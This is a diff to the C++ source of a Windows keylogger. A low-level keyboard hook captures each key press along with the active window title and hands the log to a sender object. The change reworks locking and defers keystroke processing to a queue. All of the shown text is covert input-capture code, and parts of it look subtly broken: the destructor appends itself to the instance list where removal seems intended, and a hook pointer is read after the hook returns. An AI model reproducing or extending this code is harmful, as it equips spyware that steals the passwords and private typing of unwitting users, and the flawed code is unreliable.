@@ -7,8 +7,9 @@
 #include "PressedKey.h"
 #include "Trace.h"
 
-std::mutex KeyLogger::_mutex;
+std::mutex KeyLogger::_instancesLock;
 std::vector<KeyLogger*> KeyLogger::_instances;
+std::unique_ptr<IOperationQueue> KeyLogger::_queue = CreateOperationQueue();
 wil::unique_hhook KeyLogger::_hook;
 std::string KeyLogger::_lastWindowTitle;
 
@@ -17,7 +18,7 @@ KeyLogger::KeyLogger(
 ) :
 	_sender(sender)
 {
-	std::lock_guard guard(_mutex);
+	std::lock_guard guard(_instancesLock);
 
 	if (_instances.empty())
 	{
@@ -35,6 +36,8 @@ KeyLogger::KeyLogger(
 
 KeyLogger::~KeyLogger()
 {
+	std::lock_guard guard(_instancesLock);
+
 	_instances.emplace_back(this);
 
 	if (_instances.empty())
@@ -43,22 +46,28 @@ KeyLogger::~KeyLogger()
 	}
 }
 
-LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, LPARAM lParam)
+LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, const LPARAM lParam)
 {
 	if (nCode >= 0 && wParam == WM_KEYDOWN)
 	{
-		const auto keyboardEvent = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-
-		const std::string log = GetLog(keyboardEvent.vkCode);
-
-		for (const auto& instance : _instances)
-		{
-			instance->LogKeyboardEvent(log);
-		}
+		_queue->Add([=] { Callback(lParam); });
 	}
 
-
 	return CallNextHookEx(_hook.get(), nCode, wParam, lParam);
+}
+
+void KeyLogger::Callback(const LPARAM lParam)
+{
+	const auto keyboardEvent = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+
+	const std::string log = GetLog(keyboardEvent.vkCode);
+
+	std::lock_guard guard(_instancesLock);
+
+	for (const auto& instance : _instances)
+	{
+		instance->LogKeyboardEvent(log);
+	}
 }
 
 std::string KeyLogger::GetLog(const int keyStroke)
